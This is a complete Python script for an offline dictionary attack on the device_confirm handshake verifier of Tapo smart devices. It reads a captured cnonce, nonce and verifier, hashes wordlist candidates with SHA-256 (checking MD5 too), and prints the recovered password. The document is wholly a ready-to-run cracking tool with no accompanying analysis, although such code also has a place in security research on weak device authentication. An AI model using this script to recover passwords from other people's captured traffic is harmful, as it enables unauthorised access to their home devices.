#!/usr/bin/env python3
"""Offline crack of the Tapo device_confirm verifier.

dc = SHA256(cnonce + H(pw) + nonce) + nonce + cnonce   (H = sha256 upper hex)
Usage: crack.py <capture.json> <wordlist>
Capture JSON: {"cnonce":..,"nonce":..,"device_confirm":..}
"""
import hashlib, json, sys

cap = json.load(open(sys.argv[1]))
cn, nonce, dc = cap["cnonce"], cap["nonce"], cap["device_confirm"]
pre, target = cn.encode(), dc[:64]
assert nonce in dc and cn in dc

n = 0
with open(sys.argv[2], "rb") as f:
    for line in f:
        pw = line.rstrip(b"\r\n")
        h = hashlib.sha256(pw).hexdigest().upper()
        if hashlib.sha256(pre + h.encode() + nonce.encode()).hexdigest().upper() == target:
            print(f"FOUND {pw.decode(errors='replace')!r} sha256={h}")
            hd = hashlib.md5(pw).hexdigest().upper()
            if hashlib.sha256(pre + hd.encode() + nonce.encode()).hexdigest().upper() == target:
                print("  (md5 form also matches)")
            sys.exit(0)
        n += 1
print(f"not found in {n} candidates")
sys.exit(1)
